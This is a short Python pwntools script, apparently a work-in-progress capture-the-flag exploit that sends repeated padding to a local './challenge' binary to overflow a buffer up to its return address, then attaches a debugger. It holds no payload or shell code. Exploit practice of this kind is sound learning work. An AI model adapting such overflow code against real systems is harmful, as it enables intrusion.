#!/usr/bin/python
from pwn import *
import re

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-v']

e = ELF("./challenge")
p = process("./challenge")

len_to_ret_addr = 0x400 + 8

p.sendlineafter("> ", "1")
p.sendafter(": ", "A" * 127)
len_to_ret_addr -= 128

while True :
    p.sendlineafter("> ", "2")
    res = p.readuntil(": ")
    char_len = int(re.findall("[0-9]+", res)[0])

    if len_to_ret_addr < 0 :
        print len_to_ret_addr

        gdb.attach(p)
        raw_input()

        break

    p.send("A" * char_len)
    len_to_ret_addr -= char_len


p.interactive()